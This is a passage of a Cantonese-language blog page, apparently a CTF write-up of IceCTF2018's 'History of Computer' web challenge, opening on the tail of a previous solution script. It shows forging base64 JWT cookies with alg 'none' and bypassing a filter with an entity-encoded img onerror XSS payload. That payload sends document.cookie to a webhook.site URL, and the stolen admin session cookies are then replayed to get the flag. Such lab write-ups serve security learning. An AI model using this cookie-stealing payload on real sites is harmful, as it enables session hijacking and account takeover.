class="string">""</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">	result += os.popen(<span class="string">"python label_hotnot.py ./hotornot/"</span> + f).read().replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Status: "</span> + str(index) + <span class="string">" / "</span> + str(len(files))</span><br><span class="line">	index += <span class="number">1</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"result.txt"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(result)</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure></p>
<p>最後似係qrcode , 然後執左執<br><img src="flag.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/14/IceCTF2018-HotOrNot/" data-id="cjm1zyku9000e1ww534kl1msf" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-IceCTF2018-History-Of-Computer" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/12/IceCTF2018-History-Of-Computer/" class="article-date">
  <time datetime="2018-09-12T06:08:14.000Z" itemprop="datePublished">2018-09-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/12/IceCTF2018-History-Of-Computer/">IceCTF2018-History-Of-Computer</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>首先一入到去見到有得註冊喎 , 咁註冊完登入睇下咩料子先啦<br>發現有得留 comment , 留個試下先, 留完仲有得report添喎 , 仲唔係玩xss?<br><img src="2.png" alt=""></p>
<p>發現有2個奇怪既 cookies , 分別係 session 同埋 token<br><img src="1.png" alt=""></p>
<p>咁似 base64 既 , decode黎睇下先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#session</span></span><br><span class="line">base64.b64decode(<span class="string">'eyJ1c2VyIjoyfQ.Dno_HQ.0n1XWQBTVFhQ9NxFkuqWKik5uJU=='</span>)</span><br><span class="line"><span class="comment">#&#123;"user":2&#125;\x00\xe7\xa0t4\x9fU\xd6@\x14\xd5\x16\x14=7\x11d\xba\xa5\x8a\x8aNn%</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#token</span></span><br><span class="line">base64.b64decode(<span class="string">'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0='</span>)</span><br><span class="line"><span class="comment">#&#123;"typ":"JWT","alg":"none"&#125;</span></span><br><span class="line">base64.b64decode(<span class="string">'eyJ1c2VybmFtZSI6ImNhdHBhd24iLCJmbGFnIjoiSWNlQ1RGe2hvcGUgeW91IGRvbid0IHRoaW5rIHRoaXMgaXMgYSByZWFsIGZsYWd9In0=='</span>)</span><br><span class="line"><span class="comment">#&#123;"username":"catpawn","flag":"IceCTF&#123;hope you don\'t think this is a real flag&#125;"&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>咁發現有個 username 喎 , 同埋 user係2. 有2咁應該有1啦 , 我諗終極目標係拎到user:1 既登入資料掛?<br>咁試下改個username啦<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base64.b64encode(<span class="string">'&#123;"username":"admin","flag":"IceCTF&#123;hope you don\'t think this is a real flag&#125;"&#125;'</span>)</span><br><span class="line"><span class="comment">#eyJ1c2VybmFtZSI6ImFkbWluIiwiZmxhZyI6IkljZUNURntob3BlIHlvdSBkb24ndCB0aGluayB0aGlzIGlzIGEgcmVhbCBmbGFnfSJ9</span></span><br></pre></td></tr></table></figure></p>
<p>改完之後發現右上角個username係無變過既 , 留個言試下先啦咁唯有<br><img src="3.png" alt=""></p>
<p>竟然都係無變過!!! cookies save得唔會冇用掛 , 盡下人事禁埋入去 comment 到睇<br><img src="4.png" alt=""></p>
<p>竟然變左!! , 咁開始試下構造D xss payload玩弄下個website啦<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">improt base64</span><br><span class="line">base64.b64encode(<span class="string">'&#123;"username":"&lt;script&gt;alert(1)&lt;/script&gt;","flag":"IceCTF&#123;hope you don\'t think this is a real flag&#125;"&#125;'</span>)</span><br><span class="line"><span class="comment">#eyJ1c2VybmFtZSI6IjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4iLCJmbGFnIjoiSWNlQ1RGe2hvcGUgeW91IGRvbid0IHRoaW5rIHRoaXMgaXMgYSByZWFsIGZsYWd9In0=</span></span><br></pre></td></tr></table></figure></p>
<p>但是原來有做 filtering<br><img src="5.png" alt=""></p>
<p>試下試下發現佢好似扑左都幾多野。結果最後試左呢抽野出黎係work既<br><img src="6.png" alt=""><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base64.b64encode(<span class="string">'&#123;"username":"&lt;img src=x onerror=\'&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41\'&gt;","flag":"IceCTF&#123;hope you don\'t think this is a real flag&#125;"&#125;'</span>)</span><br><span class="line"><span class="comment">#eyJ1c2VybmFtZSI6IjxpbWcgc3JjPXggb25lcnJvcj0nJiMxMDYmIzk3JiMxMTgmIzk3JiMxMTUmIzk5JiMxMTQmIzEwNSYjMTEyJiMxMTYmIzU4JiM5NyYjMTA4JiMxMDEmIzExNCYjMTE2JiM0MCYjMzkmIzg4JiM4MyYjODMmIzM5JiM0MSc+IiwiZmxhZyI6IkljZUNURntob3BlIHlvdSBkb24ndCB0aGluayB0aGlzIGlzIGEgcmVhbCBmbGFnfSJ9</span></span><br></pre></td></tr></table></figure></p>
<p>呢抽野<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41</span><br></pre></td></tr></table></figure></p>
<p>其實係<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&apos;XSS&apos;)</span><br></pre></td></tr></table></figure></p>
<p>大家可以用呢個網試下轉<br><a href="http://evuln.com/tools/xss-encoder/" target="_blank" rel="noopener">http://evuln.com/tools/xss-encoder/</a></p>
<p>然後就可以構造個http request比admin access啦<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">httpGet</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> xmlHttp = <span class="keyword">new</span> XMLHttpRequest();xmlHttp.open(<span class="string">"GET"</span>, <span class="string">"https://webhook.site/928e4501-4b73-4491-a3de-10e0cad789cb?a="</span> + <span class="built_in">document</span>.cookie, <span class="literal">false</span> );xmlHttp.send( <span class="literal">null</span> );&#125;httpGet();</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base64.b64encode(<span class="string">'&#123;"username":"&lt;img src=x onerror=\'&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#32&amp;#104&amp;#116&amp;#116&amp;#112&amp;#71&amp;#101&amp;#116&amp;#40&amp;#41&amp;#123&amp;#118&amp;#97&amp;#114&amp;#32&amp;#120&amp;#109&amp;#108&amp;#72&amp;#116&amp;#116&amp;#112&amp;#32&amp;#61&amp;#32&amp;#110&amp;#101&amp;#119&amp;#32&amp;#88&amp;#77&amp;#76&amp;#72&amp;#116&amp;#116&amp;#112&amp;#82&amp;#101&amp;#113&amp;#117&amp;#101&amp;#115&amp;#116&amp;#40&amp;#41&amp;#59&amp;#120&amp;#109&amp;#108&amp;#72&amp;#116&amp;#116&amp;#112&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#34&amp;#71&amp;#69&amp;#84&amp;#34&amp;#44&amp;#32&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#115&amp;#58&amp;#47&amp;#47&amp;#119&amp;#101&amp;#98&amp;#104&amp;#111&amp;#111&amp;#107&amp;#46&amp;#115&amp;#105&amp;#116&amp;#101&amp;#47&amp;#57&amp;#50&amp;#56&amp;#101&amp;#52&amp;#53&amp;#48&amp;#49&amp;#45&amp;#52&amp;#98&amp;#55&amp;#51&amp;#45&amp;#52&amp;#52&amp;#57&amp;#49&amp;#45&amp;#97&amp;#51&amp;#100&amp;#101&amp;#45&amp;#49&amp;#48&amp;#101&amp;#48&amp;#99&amp;#97&amp;#100&amp;#55&amp;#56&amp;#57&amp;#99&amp;#98&amp;#63&amp;#97&amp;#61&amp;#34&amp;#32&amp;#43&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#44&amp;#32&amp;#102&amp;#97&amp;#108&amp;#115&amp;#101&amp;#32&amp;#41&amp;#59&amp;#120&amp;#109&amp;#108&amp;#72&amp;#116&amp;#116&amp;#112&amp;#46&amp;#115&amp;#101&amp;#110&amp;#100&amp;#40&amp;#32&amp;#110&amp;#117&amp;#108&amp;#108&amp;#32&amp;#41&amp;#59&amp;#125&amp;#104&amp;#116&amp;#116&amp;#112&amp;#71&amp;#101&amp;#116&amp;#40&amp;#41&amp;#59\'&gt;","flag":"IceCTF&#123;hope you don\'t think this is a real flag&#125;"&#125;'</span>)</span><br><span class="line"><span class="comment">#eyJ1c2VybmFtZSI6IjxpbWcgc3JjPXggb25lcnJvcj0nJiMxMDImIzExNyYjMTEwJiM5OSYjMTE2JiMxMDUmIzExMSYjMTEwJiMzMiYjMTA0JiMxMTYmIzExNiYjMTEyJiM3MSYjMTAxJiMxMTYmIzQwJiM0MSYjMTIzJiMxMTgmIzk3JiMxMTQmIzMyJiMxMjAmIzEwOSYjMTA4JiM3MiYjMTE2JiMxMTYmIzExMiYjMzImIzYxJiMzMiYjMTEwJiMxMDEmIzExOSYjMzImIzg4JiM3NyYjNzYmIzcyJiMxMTYmIzExNiYjMTEyJiM4MiYjMTAxJiMxMTMmIzExNyYjMTAxJiMxMTUmIzExNiYjNDAmIzQxJiM1OSYjMTIwJiMxMDkmIzEwOCYjNzImIzExNiYjMTE2JiMxMTImIzQ2JiMxMTEmIzExMiYjMTAxJiMxMTAmIzQwJiMzNCYjNzEmIzY5JiM4NCYjMzQmIzQ0JiMzMiYjMzQmIzEwNCYjMTE2JiMxMTYmIzExMiYjMTE1JiM1OCYjNDcmIzQ3JiMxMTkmIzEwMSYjOTgmIzEwNCYjMTExJiMxMTEmIzEwNyYjNDYmIzExNSYjMTA1JiMxMTYmIzEwMSYjNDcmIzU3JiM1MCYjNTYmIzEwMSYjNTImIzUzJiM0OCYjNDkmIzQ1JiM1MiYjOTgmIzU1JiM1MSYjNDUmIzUyJiM1MiYjNTcmIzQ5JiM0NSYjOTcmIzUxJiMxMDAmIzEwMSYjNDUmIzQ5JiM0OCYjMTAxJiM0OCYjOTkmIzk3JiMxMDAmIzU1JiM1NiYjNTcmIzk5JiM5OCYjNjMmIzk3JiM2MSYjMzQmIzMyJiM0MyYjMzImIzEwMCYjMTExJiM5OSYjMTE3JiMxMDkmIzEwMSYjMTEwJiMxMTYmIzQ2JiM5OSYjMTExJiMxMTEmIzEwNyYjMTA1JiMxMDEmIzQ0JiMzMiYjMTAyJiM5NyYjMTA4JiMxMTUmIzEwMSYjMzImIzQxJiM1OSYjMTIwJiMxMDkmIzEwOCYjNzImIzExNiYjMTE2JiMxMTImIzQ2JiMxMTUmIzEwMSYjMTEwJiMxMDAmIzQwJiMzMiYjMTEwJiMxMTcmIzEwOCYjMTA4JiMzMiYjNDEmIzU5JiMxMjUmIzEwNCYjMTE2JiMxMTYmIzExMiYjNzEmIzEwMSYjMTE2JiM0MCYjNDEmIzU5Jz4iLCJmbGFnIjoiSWNlQ1RGe2hvcGUgeW91IGRvbid0IHRoaW5rIHRoaXMgaXMgYSByZWFsIGZsYWd9In0=</span></span><br></pre></td></tr></table></figure>
<p>然後禁 report , 再等幾秒<br><img src="7.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhook.site/928e4501-4b73-4491-a3de-10e0cad789cb?a=token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZmxhZyI6IkljZUNURntob3BlIHlvdSBkb24ndCB0aGluayB0aGlzIGlzIGEgcmVhbCBmbGFnfSJ9.; session=eyJ1c2VyIjoxfQ.Dnm2FA.P93MJ-Nl9MSAc0DO0eRqNcUQGrU</span><br></pre></td></tr></table></figure></p>
<p>最後 get flag!<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cookie = &#123;<span class="string">'token'</span>:<span class="string">'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZmxhZyI6IkljZUNURntob3BlIHlvdSBkb24ndCB0aGluayB0aGlzIGlzIGEgcmVhbCBmbGFnfSJ9.'</span>, <span class="string">'session'</span>:<span class="string">'eyJ1c2VyIjoxfQ.Dnm2FA.P93MJ-Nl9MSAc0DO0eRqNcUQGrU'</span>&#125;</span><br><span class="line">requests.get(<span class="string">"https://43xa7xhkaj0cd8c-history.labs.icec.tf/"</span>, cookies=cookie).text</span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--Import Google Icon Font--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"https://fonts.googleapis.com/icon?family=Material+Icons"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--Import materialize.css--&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static/css/materialize.min.css"</span>  <span class="attr">media</span>=<span class="string">"screen,projection"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static/css/main.css"</span>  <span class="attr">media</span>=<span class="string">"screen,projection"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static/css/style.css"</span>  <span class="attr">media</span>=<span class="string">"screen,projection"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!--Let browser know website is optimized for mobile--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-wrapper white"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span> <span class="attr">class</span>=<span class="string">"brand-logo"</span>&gt;</span>History of Computing<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"nav-mobile"</span> <span class="attr">class</span>=<span class="string">"right hide-on-med-and-down"</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/logout"</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ribbon pink"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"flag center blue white-text"</span>&gt;</span></span><br><span class="line">        IceCTF&#123;who_trusts_these_cookies_anyway?&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col s12"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-image"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/img/icectfteam.jpg"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"card-title"</span>&gt;</span>The First Compiler<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn-floating btn-large waves-effect waves-light pink comment-btn modal-trigger"</span> <span class="attr">href</span>=<span class="string">"#comment-modal"</span> <span class="attr">data-id</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"material-icons"</span>&gt;</span>comment<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-content"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>IceCTF Worked on The First Compiler<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>It\'s not very commonly known, but the IceCTF actually worked on the first compiler with the famous Grace Hopper<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>The IceCTF team is responsible for a lot of the early achievements in the Computer Science field, not just the first compiler. Duis turpis nisl, accumsan ut pulvinar sit amet, vestibulum id justo. Nunc laoreet urna ut augue pellentesque, non tempus orci maximus. Aenean eget aliquet enim.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Sed purus ligula, gravida nec lorem in, vulputate lobortis tortor. Sed blandit rutrum malesuada. Aenean feugiat lectus sit amet lacus dictum sagittis. Nunc interdum justo a felis venenatis molestie. Etiam lacinia mi vitae eros tempus pharetra. Cras a malesuada ex. Vivamus vel est laoreet, facilisis dolor in, porttitor est. Suspendisse in pulvinar ex.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ribbon cyan"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col s12"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-image"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/img/eniac.jpg"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"card-title"</span>&gt;</span>The ENIAC!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn-floating btn-large waves-effect waves-light cyan comment-btn modal-trigger"</span> <span class="attr">href</span>=<span class="string">"#comment-modal"</span> <span class="attr">data-id</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"material-icons"</span>&gt;</span>comment<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-content"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>The IceCTF Team Created The ENIAC!<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Along with the first compiler, the IceCTF also work on creating the very first computer. The ENIAC! <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>There\'s no suprise that the brilliant minds that made one of the most successful hacking competitions in 2018 also were involved with creating what is today known as "the first computer". Although the IceCTF team was not happy with how history decided to name their machine. They opted for the more hip name "puter".<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Sed purus ligula, gravida nec lorem in, vulputate lobortis tortor. Sed blandit rutrum malesuada. Aenean feugiat lectus sit amet lacus dictum sagittis. Nunc interdum justo a felis venenatis molestie. Etiam lacinia mi vitae eros tempus pharetra. Cras a malesuada ex. Vivamus vel est laoreet, facilisis dolor in, porttitor est. Suspendisse in pulvinar ex.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"page-footer grey darken-3"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 